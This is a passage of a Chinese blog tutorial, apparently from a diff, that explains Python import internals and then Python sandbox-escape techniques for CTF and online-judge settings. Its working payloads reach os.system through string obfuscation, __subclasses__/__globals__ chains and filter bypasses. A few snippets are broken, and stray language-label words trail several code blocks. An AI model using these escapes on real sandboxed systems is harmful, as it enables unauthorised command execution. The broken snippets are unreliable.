+<p>在 <code>find_spec()</code> 内部，会迭代 path 的每个条目，并且每次都查找与条目相对应的 <em>PathEntryFinder</em>。但由于这个操作会很耗资源，因此 <em>PathBasedFinder</em> 会维持一个缓存 —— <code>sys.path_importer_caceh</code> 来存放路径条目到 finder 之间的映射（虽然是这样子命名，但它存放的确实是 finder 对象而不是 importer 对象）。那么只要条目找到过一次 finder 就不会重新再匹配（你可以手动移除缓存条目来达到再次强制匹配的目的）。</p>
+<p>如果缓存中没有对应路径条目的键，则会迭代 <code>sys.path_hooks</code> 中的每个 可调用对象。这些可调用对象都接受一个 <code>path</code> 参数，并返回一个 <em>PathEntryFinder</em> 或者抛出 <code>ImportError</code> 异常。</p>
+<p>如果遍历完整个 <code>sys.path_hooks</code> 的可调用对象都没有返回 <em>PathEntryFinder</em>，则 <code>find_spec()</code> 方法会在 <code>sys.path_importer_cache</code> 中存入 <code>None</code> 并返回 <code>None</code> ，表示 <em>PathBasedFinder</em> 无法找到该模块。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>python启动时默认初始化能得到的:</p>
+<ul>
+<li>sys.modules : 一个存放了曾经导入的模块(也包括一些内置模块)的字典(缓存)</li>
+<li>sys.path ：初始化的路径(包括项目路径，系统PATH路径，Python安装的路径)</li>
+</ul>
+<p>当需要import一个模块时，主要分为查找和加载两步</p>
+<ul>
+<li>查找：首先在sys.modules中查找，若未查找到，则触发相应查找机制，通过内置的finder查找器在已经初始化好（sys.path;meta_path）的路径下寻找模块,若找到则会返回一个 <code>spec</code> 对象，否则抛出不能找到模块的异常</li>
+<li>加载：首先会将模块信息缓存在sys.modules中，如果加载失败，那么失败的模块会从 <code>sys.modules</code> 中被移除，然后创建module对象，创建相应的命名空间，并对该module对象进行初始化–写入一些模块内置属性（__name__、__spec__等等）然后传递module对象给加载核心loader,在模块的全局命名空间（module.__dict__）中执行模块代码(创建模块代码中相应对象和执行相应代码)。如果 loader 不能执行模块，应该抛出 <code>ImportError</code> 异常</li>
+</ul>
+<p>加载成功后返回对应module对象赋给import 后面的模块名(当然也可以通过as赋予其他名字)，并写入缓存</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="http://sinhub.cn/2019/05/python-import-machinery-part-one/">http://sinhub.cn/2019/05/python-import-machinery-part-one/</a></p>
+<h1 id="命令执行沙箱逃逸"><a href="#命令执行沙箱逃逸" class="headerlink" title="命令执行沙箱逃逸"></a>命令执行沙箱逃逸</h1><h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>直接禁用 <code>import os</code> 肯定是不行的</p>
+<pre class="language-none"><code class="language-none">import  os
+import   os
+import    os
+...</code></pre>
+
+<p>如果多个空格也过滤了，Python 能够 import 的可不止 <code>import</code>，还有 <code>__import__</code>：<code>__import__('os')</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module('os').system('ls')</code></p>
+<p>import本质上就是执行一遍导入的库。这个过程实际上可以用 <code>execfile</code> 来代替（python2）：</p>
+<pre class="language-none"><code class="language-none">execfile('/usr/lib/python2.7/os.py')
+system('ls')</code></pre>
+
+<p>也可以这样，比较通用</p>
+<pre class="language-none"><code class="language-none">with open('/usr/lib/python3.6/os.py','r') as f:
+    exec(f.read())
+
+system('ls')</code></pre>
+
+<p>不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下</p>
+<pre class="language-none"><code class="language-none">import sys
+print(sys.path)</code></pre>
+
+<p>如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：</p>
+<p>注意，这里不能用 <code>del sys.modules['os']</code>，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。</p>
+<p>所以删了 <code>sys.modules['os']</code> 只会让 Python 重新加载一次 os。</p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>可以通过 <code>getattr</code> 拿到对象的方法、属性</p>
+<p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code></p>
+<pre class="language-none"><code class="language-none">import os
+getattr(os, 'metsys'[::-1])('whoami')</code></pre>
+
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('whoami')
+macr0phag3
+0</code></pre>
+
+<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os</p>
+<p>以禁掉os字符串为例：</p>
+<ol>
+<li>字符串数组逆序</li>
+</ol>
+<pre class="language-none"><code class="language-none">__import__('so'[::-1]).system('ls')</code></pre>
+
+<ol>
+<li>字符串拼接</li>
+</ol>
+<pre class="language-none"><code class="language-none">b = 'o'
+a = 's'
+__import__(a+b).system('ls')</code></pre>
+
+<ol>
+<li>还可以利用 <code>eval</code> 或者 <code>exec</code></li>
+</ol>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
+macr0phag3
+0
+&gt;&gt;&gt; exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
+macr0phag3</code></pre>
+
+<p>eval、exec 都是相当危险的函数，exec 比 eval 还要危险</p>
+<p>对字符串的处理可以有：逆序、拼接、base64、hex、rot13…等等，</p>
+<pre class="language-none"><code class="language-none">['__builtins__'] 
+['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']
+[u'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']
+['X19idWlsdGluc19f'.decode('base64')]
+['__buil'+'tins__']
+['__buil''tins__']
+['__buil'.__add__('tins__')]
+["_builtins_".join("__")]
+['%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]
+...</code></pre>
+
+<h2 id="builtins、builtin-与-builtins"><a href="#builtins、builtin-与-builtins" class="headerlink" title="builtins、builtin__与__builtins"></a><strong>builtins、<strong>builtin__与__builtins</strong></strong></h2><p>在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则来找的，其中 B 即代表内建模块</p>
+<p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; '__import__' in dir(__builtins__)
+True
+&gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami')
+macr0phag3
+0
+&gt;&gt;&gt; 'eval' in dir(__builtins__)
+True
+&gt;&gt;&gt; 'execfile' in dir(__builtins__)
+True</code></pre>
+
+<p>这里稍微解释下 <code>x.__dict__</code> ，它是 x 内部所有属性名和属性值组成的字典，有以下特点：</p>
+<ol>
+<li>内置的数据类型没有 <strong>dict</strong> 属性</li>
+<li>每个类有自己的 <strong>dict</strong> 属性，就算存着继承关系，父类的 <strong>dict</strong> 并不会影响子类的 <strong>dict</strong></li>
+<li>对象也有自己的 <strong>dict</strong> 属性，包含 <code>self.xxx</code> 这种实例属性</li>
+</ol>
+<p>那么既然<code>__builtins__</code>有这么多危险的函数，不如将里面的危险函数破坏了：</p>
+<p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。不过，我们在使用 <code>reload</code> 的时候也没导入，说明 <code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过</p>
+<h2 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a><strong>通过继承关系逃逸</strong></h2><p>在 Python 中提到继承就不得不提 <code>mro</code>，<code>mro</code>就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 3.x 中新式类一统江湖，默认继承 <code>object</code>，当然也是使用的 C3 搜索算法。。。扯远了扯远了，感兴趣的可以搜搜。不管怎么说，总是让人去判断继承关系显然是反人类的，所以 Python 中新式类都有个属性，<code>.__mro__</code> 或 <code>.mro()</code>，是个元组，记录了继承关系：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__
+(&lt;class 'str'&gt;, &lt;class 'object'&gt;)
+CEYLON</code></pre>
+
+<p> 类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>''</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; class test:
+...  pass
+...
+&gt;&gt;&gt; test.__bases__
+()
+&gt;&gt;&gt; class test(object):
+...  pass
+...
+&gt;&gt;&gt; test.__bases__
+(&lt;type 'object'&gt;,)
+PYTHON-REPL</code></pre>
+
+<p>那么知道这个有什么用呢？</p>
+<p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os。例如，<code>site</code> 这个库就有 <code>os</code>：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; import site
+&gt;&gt;&gt; site.os
+&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py'&gt;
+MOONSCRIPT</code></pre>
+
+<p>怎么理解这个 <strong>globals</strong> 呢？它是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。除了 <code>builtin_function_or_method</code> 或者是 <code>wrapper_descriptor</code> 、<code>method-wrapper</code> 类型的函数，例如 <code>range</code>、<code>range.__init__</code>、<code>''.split</code> 等等。</p>
+<p>那么也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; import site
+&gt;&gt;&gt; os
+Traceback (most recent call last):
+ File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+NameError: name 'os' is not defined
+&gt;&gt;&gt; os = reload(site.os)
+&gt;&gt;&gt; os.system('whoami')
+macr0phag3
+0
+PYTHON-REPL</code></pre>
+
+<p>还有，既然所有的类都继承的<code>object</code>，那么我们先用<code>__subclasses__</code>看看它的子类，以 2.x 为例：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
+...
+(0, &lt;type 'type'&gt;)
+(1, &lt;type 'weakref'&gt;)
+(2, &lt;type 'weakcallableproxy'&gt;)
+(3, &lt;type 'weakproxy'&gt;)
+(4, &lt;type 'int'&gt;)
+(5, &lt;type 'basestring'&gt;)
+(6, &lt;type 'bytearray'&gt;)
+(7, &lt;type 'list'&gt;)
+(8, &lt;type 'NoneType'&gt;)
+(9, &lt;type 'NotImplementedType'&gt;)
+(10, &lt;type 'traceback'&gt;)
+(11, &lt;type 'super'&gt;)
+(12, &lt;type 'xrange'&gt;)
+(13, &lt;type 'dict'&gt;)
+(14, &lt;type 'set'&gt;)
+(15, &lt;type 'slice'&gt;)
+(16, &lt;type 'staticmethod'&gt;)
+(17, &lt;type 'complex'&gt;)
+(18, &lt;type 'float'&gt;)
+(19, &lt;type 'buffer'&gt;)
+(20, &lt;type 'long'&gt;)
+(21, &lt;type 'frozenset'&gt;)
+(22, &lt;type 'property'&gt;)
+(23, &lt;type 'memoryview'&gt;)
+(24, &lt;type 'tuple'&gt;)
+(25, &lt;type 'enumerate'&gt;)
+(26, &lt;type 'reversed'&gt;)
+(27, &lt;type 'code'&gt;)
+(28, &lt;type 'frame'&gt;)
+(29, &lt;type 'builtin_function_or_method'&gt;)
+(30, &lt;type 'instancemethod'&gt;)
+(31, &lt;type 'function'&gt;)
+(32, &lt;type 'classobj'&gt;)
+(33, &lt;type 'dictproxy'&gt;)
+(34, &lt;type 'generator'&gt;)
+(35, &lt;type 'getset_descriptor'&gt;)
+(36, &lt;type 'wrapper_descriptor'&gt;)
+(37, &lt;type 'instance'&gt;)
+(38, &lt;type 'ellipsis'&gt;)
+(39, &lt;type 'member_descriptor'&gt;)
+(40, &lt;type 'file'&gt;)
+(41, &lt;type 'PyCapsule'&gt;)
+(42, &lt;type 'cell'&gt;)
+(43, &lt;type 'callable-iterator'&gt;)
+(44, &lt;type 'iterator'&gt;)
+(45, &lt;type 'sys.long_info'&gt;)
+(46, &lt;type 'sys.float_info'&gt;)
+(47, &lt;type 'EncodingMap'&gt;)
+(48, &lt;type 'fieldnameiterator'&gt;)
+(49, &lt;type 'formatteriterator'&gt;)
+(50, &lt;type 'sys.version_info'&gt;)
+(51, &lt;type 'sys.flags'&gt;)
+(52, &lt;type 'exceptions.BaseException'&gt;)
+(53, &lt;type 'module'&gt;)
+(54, &lt;type 'imp.NullImporter'&gt;)
+(55, &lt;type 'zipimport.zipimporter'&gt;)
+(56, &lt;type 'posix.stat_result'&gt;)
+(57, &lt;type 'posix.statvfs_result'&gt;)
+(58, &lt;class 'warnings.WarningMessage'&gt;)
+(59, &lt;class 'warnings.catch_warnings'&gt;)
+(60, &lt;class '_weakrefset._IterationGuard'&gt;)
+(61, &lt;class '_weakrefset.WeakSet'&gt;)
+(62, &lt;class '_abcoll.Hashable'&gt;)
+(63, &lt;type 'classmethod'&gt;)
+(64, &lt;class '_abcoll.Iterable'&gt;)
+(65, &lt;class '_abcoll.Sized'&gt;)
+(66, &lt;class '_abcoll.Container'&gt;)
+(67, &lt;class '_abcoll.Callable'&gt;)
+(68, &lt;type 'dict_keys'&gt;)
+(69, &lt;type 'dict_items'&gt;)
+(70, &lt;type 'dict_values'&gt;)
+(71, &lt;class 'site._Printer'&gt;)
+(72, &lt;class 'site._Helper'&gt;)
+(73, &lt;type '_sre.SRE_Pattern'&gt;)
+(74, &lt;type '_sre.SRE_Match'&gt;)
+(75, &lt;type '_sre.SRE_Scanner'&gt;)
+(76, &lt;class 'site.Quitter'&gt;)
+(77, &lt;class 'codecs.IncrementalEncoder'&gt;)
+(78, &lt;class 'codecs.IncrementalDecoder'&gt;)
+PYTHON</code></pre>
+
+<p>可以看到，site 就在里面，以 2.x 的<code>site._Printer</code>为例（py3.x 中已经移除了这里 <strong>globals</strong> 的 <code>os</code>）：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os']
+&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;
+
+&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：
+&gt;&gt;&gt; [i._Printer__setup.__globals__['os'] for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_Printer"]
+&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;
+PROLOG</code></pre>
+
+<p>os 又回来了。并且 site 中还有 <code>__builtins__</code>。</p>
+<p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; import warnings
+&gt;&gt;&gt; 
+&gt;&gt;&gt; warnings.os
+Traceback (most recent call last):
+ File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+AttributeError: 'module' object has no attribute 'os'
+&gt;&gt;&gt; 
+&gt;&gt;&gt; warnings.linecache
+&lt;module 'linecache' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc'&gt;
+&gt;&gt;&gt;
+&gt;&gt;&gt; warnings.linecache.os
+&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;
+PYTHON</code></pre>
+
+<p>在继承链中就可以这样（py3.x 中已经移除了这里 <strong>globals</strong> 的 <code>linecache</code>）：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')
+macr0phag3
+0
+&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：
+&gt;&gt;&gt; [i.__init__.__globals__['linecache'].__dict__['os'].system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "catch_warnings"]
+PROLOG</code></pre>
+
+<p> 顺便说一下，<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性：</p>
+<pre class="language-none"><code class="language-none"> def __init__(self, record=False, module=None):
+...
+ self._module = sys.modules['warnings'] if module is None else module
+...
+OXYGENE</code></pre>
+
+<p>所以通过<code>_module</code>也可以构造 payload（py3.x 中已经移除了 <code>catch_warnings</code> 的 <code>linecache</code>）：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.linecache.os.system('whoami')
+macr0phag3
+0
+STYLUS</code></pre>
+
+<p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p>
+<p>同样，py3.x 中有<code>&lt;class 'os._wrap_close'&gt;</code>，利用方式可以为：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')
+macr0phag3
+0
+&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：
+&gt;&gt;&gt; [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('whoami')
+PROLOG</code></pre>
+
+<p>当然这样也是可以的（3.x）：</p>
+<pre class="language-none"><code class="language-none">set.mro()[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')
+PYTHON</code></pre>
+
+<p>顺便提一下，<code>object</code> 本来就是可以使用的，如果没过滤的话，payload 可以再简化为：</p>
+<pre class="language-none"><code class="language-none">object.__subclasses__()[133].__init__.__globals__['system']('whoami')
+PYTHON</code></pre>
+
+<p>还有一种是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p>
+<pre class="language-none"><code class="language-none">"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval, '1+1')
+SQF</code></pre>
+
+<p> 或者简单一点：</p>
+<pre class="language-none"><code class="language-none">[].pop.__class__.__call__(eval, '1+1')
+STYLUS</code></pre>
+
+<p>上面这些 payload 大多数是直接 index 了，但是直接用 index 不太健壮，可以都换成列表推导式，用 <strong>name</strong> 来获取想要的 class，上面也举了好几个例子了，这里就不多说啦。</p>
+<p>最后再补充几个。</p>
+<p>可以这样利用：</p>
+<pre class="language-none"><code class="language-none">class test(dict):
+ def __init__(self):
+ print(super(test, self).keys.__class__.__call__(eval, '1+1'))
+ # 如果是 3.x 的话可以简写为：
+ # super().keys.__class__.__call__(eval, '1+1'))
+test()
+SCSS</code></pre>
+
+<p>还可以利用异常逃逸：</p>
+<pre class="language-none"><code class="language-none">hack = lambda : [0][1]
+try:
+ hack()
+except Exception as e:
+ e.__traceback__.tb_next.tb_frame.f_globals['__builtins__']['__import__']('os').system('whoami')
+PYTHON</code></pre>
+
+<p>还可以利用 <code>format</code>：</p>
+<ol>
+<li><code>"{0.__class__.__base__}".format([])</code></li>
+<li><code>"{x.__class__.__base__}".format(x=[])</code></li>
+<li><code>"{.__class__.__base__}".format([])</code></li>
+<li><code>("{0.__class_"+"_.__base__}").format([])</code></li>
+</ol>
+<p>（这里顺手记录下，对于字典键是整数型的比如 <code>{"1":2}</code>，format 是无法拿到值的 :)，这样会报错：<code>''' {0['1']} '''.format({"1":2})</code>，<code>'1'</code> 引号去掉的话又会报没有这个键，这个特性可以见<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/string.html#format-string-syntax">文档</a>）</p>
+<p>上面的这些利用方式总结起来就是通过 <code>.mro()</code>、<code>__class__</code>、<code>type(...)</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__base__</code>、<code>__bases__</code> 等属性/方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code>。</p>
+<p>最后，其实沙箱逃逸，对于不同的第三方库可能会存在一些特殊的利用方式，比如 <code>jinja2</code>，这类属于 <code>SSTI</code> 漏洞，可以看这篇博客：<a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/">传送门🚪</a>，这里就不多说了。</p>
+<p>其实 SSTI 也会用到这里的很多技巧，两者知识面相互交叠。</p>
+<h1 id="文件读写沙箱逃逸"><a href="#文件读写沙箱逃逸" class="headerlink" title="文件读写沙箱逃逸"></a><strong>文件读写</strong>沙箱逃逸</h1><p>2.x 有个内建的 <code>file</code>：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; file('key').read()
+'Macr0phag3\n'
+&gt;&gt;&gt; file('key', 'w').write('Macr0phag3')
+&gt;&gt;&gt; file('key').read()
+'Macr0phag3'
+DELPHI</code></pre>
+
+<p>还有个 <code>open</code>，2.x 与 3.x 通用。</p>
+<p>还有一些库，例如：<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>(r)。</p>
+<p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来： math.py：</p>
+<pre class="language-none"><code class="language-none">import os
+
+print(os.system('whoami'))
+MOONSCRIPT</code></pre>
+
+<p> 调用</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; import math
+macr0phag3
+0
+PYTHON-REPL</code></pre>
+
+<p> 这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; 're' in sys.modules
+True
+&gt;&gt;&gt; 'math' in sys.modules
+False
+&gt;&gt;&gt;
+PYTHON-REPL</code></pre>
+
+<p> 当然在<code>import re</code> 之前<code>del sys.modules['re']</code>也不是不可以…</p>
+<p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p>
+<p>读文件暂时没什么发现特别的地方。</p>
+<p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; __builtins__.open('key').read()
+'Macr0phag3\n'
+LIVECODESERVER</code></pre>
+
+<p> 或者</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]('key').read()
+'Macr0phag3'
+GCODE</code></pre>
+
+<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a><strong>敏感信息泄露</strong></h1><p>这个也算只能读吧。</p>
+<ol>
+<li><code>dir()</code></li>
+<li><code>__import__("__main__").x</code>，其中 <strong>main</strong> 还会泄露脚本的绝对路径：<code>&lt;module '__main__' from 'xxx.py'&gt;</code></li>
+<li><code>__file__</code>，文件绝对路径</li>
+<li><code>x.__dict__</code></li>
+<li><code>locals()</code></li>
+<li><code>globals()</code></li>
+<li><code>vars()</code></li>
+<li><code>sys._getframe(0).f_code.co_varnames</code></li>
+<li><code>sys._getframe(0).f_locals</code></li>
+<li><code>inspect.x</code>，inspect 有很多方法可以获取信息，比如获取源码可以用 <code>inspect.getsource</code>，还有其他很多的功能</li>
+<li>…</li>
+</ol>
+<p>这有一篇不错的文章，推荐阅读：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dechinphy/p/modify-locals.html">https://www.cnblogs.com/dechinphy/p/modify-locals.html</a></p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h1><p>这些行为不像是 oj 会做得出来的，ctf 倒是有可能出现。</p>
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤 [ ]"></a><strong>过滤 [ ]</strong></h3><p>应对的方式就是将<code>[]</code>的功能用<code>pop</code>、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code>）：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('whoami').read()
+'macr0phag3\n'
+STYLUS</code></pre>
+
+<p>当然，dict 也是可以 pop 的：<code>{"a": 1}.pop("a")</code></p>
+<p>当然也可以用 <code>next(iter())</code> 替代，或许可以加上 <code>max</code> 之类的玩意。</p>
+<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a><strong>过滤引号</strong></h3><blockquote>
+<p>chr</p>
+</blockquote>
+<p>最简单就是用 <code>chr</code> 啦</p>
+<pre class="language-none"><code class="language-none">os.system(
+ chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)
+)
+SCSS</code></pre>
+
+<blockquote>
+<p>扣字符</p>
+</blockquote>
+<p>利用 <code>str</code> 和 <code>[]</code>，挨个把字符拼接出来</p>
+<pre class="language-none"><code class="language-none">os.system(
+ str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(()a)[10]+str(().__class__.__new__)[3]
+)
+SCSS</code></pre>
+
+<p> 当然 <code>[]</code> 如果被过滤了也可以 bypass，前面说过了。</p>
+<p>如果 str 被过滤了怎么办呢？<code>type('')()</code>、<code>format()</code> 即可。同理，<code>int</code>、<code>list</code> 都可以用 <code>type</code> 构造出来。</p>
+<blockquote>
+<p>格式化字符串</p>
+</blockquote>
+<p>那过滤了引号，格式化字符串还能用吗？</p>
+<p><code>(chr(37)+str({}.__class__)[1])%100 == 'd'</code></p>
+<p>又起飞了…</p>
+<blockquote>
+<p>dict() 拿键它不香吗？</p>
+<pre class="language-none"><code class="language-none">'whoami' ==
+list(dict(whoami=1))[0] ==
+str(dict(whoami=1))[2:8] ==a
+PYTHON</code></pre>
+</blockquote>
+<h3 id="限制数字"><a href="#限制数字" class="headerlink" title="限制数字"></a><strong>限制数字</strong></h3><p>上面提到了字符串过滤绕过，顺便说一下，如果是过滤了数字（虽然这种情况很少见），那绕过的方式就更多了，我这里随便列下：</p>
+<ol>
+<li>0：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code>、<code>any(())</code></li>
+<li>1：<code>int(bool([""]))</code>、<code>True</code>、<code>all(())</code>、<code>int(list(list(dict(a၁=())).pop()).pop())</code></li>
+<li>获取稍微大的数字：<code>len(str({}.keys))</code>，不过需要慢慢找长度符合的字符串</li>
+<li>1.0：<code>float(True)</code></li>
+<li>-1：<code>~0</code></li>
+<li>…</li>
+</ol>
+<p>其实有了 <code>0</code> 就可以了，要啥整数直接做运算即可：</p>
+<pre class="language-none"><code class="language-none">0 ** 0 == 1
+1 + 1 == 2
+2 + 1 == 3
+2 ** 2 == 4
+...
+PYTHON</code></pre>
+
+<p>任意浮点数稍微麻烦点，需要想办法运算，但是一定可以搞出来，除非是 π 这种玩意…</p>
+<h3 id="限制空格"><a href="#限制空格" class="headerlink" title="限制空格"></a><strong>限制空格</strong></h3><p>空格通常来说可以通过 <code>()</code>、<code>[]</code> 替换掉。例如：</p>
+<p><code>[i for i in range(10) if i == 5]</code> 可以替换为 <code>[[i][0]for(i)in(range(10))if(i)==5]</code></p>
+<h3 id="限制运算符"><a href="#限制运算符" class="headerlink" title="限制运算符"></a><strong>限制运算符</strong></h3><blockquote>
+<p><code>&gt; &lt; ! - +</code> 这几个比较简单就不说了。</p>
+</blockquote>
+<p><code>==</code> 可以用 <code>in</code> 来替换。</p>
+<p>替换 <code>or</code> 的测试代码</p>
+<pre class="language-none"><code class="language-none">for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
+ ans = i[0]==i[1] or i[2]==i[3]
+ print(bool(eval(f'{i[0]==i[1]} | {i[2]==i[3]}')) == ans)
+ print(bool(eval(f'- {i[0]==i[1]} - {i[2]==i[3]}')) == ans)
+ print(bool(eval(f'{i[0]==i[1]} + {i[2]==i[3]}')) == ans)
+PY</code></pre>
+
+<p> 上面这几个表达式都可以替换掉 <code>or</code></p>
+<p>替换 <code>and</code> 的测试代码</p>
+<pre class="language-none"><code class="language-none">for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
+ ans = i[0]==i[1] and i[2]==i[3]
+ print(bool(eval(f'{i[0]==i[1]} &amp; {i[2]==i[3]}')) == ans)
+ print(bool(eval(f'{i[0]==i[1]} * {i[2]==i[3]}')) == ans)
